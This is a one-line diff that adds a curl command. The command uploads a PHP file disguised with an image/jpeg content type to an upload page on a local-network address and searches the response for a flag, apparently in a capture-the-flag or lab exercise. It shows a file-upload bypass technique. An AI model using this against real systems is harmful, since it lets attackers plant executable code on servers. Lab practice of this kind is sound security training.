@@ -1,0 +1,1 @@
+curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@dreadful.php;type=image/jpeg' http://192.168.43.251/?page=upload# | grep "flag"
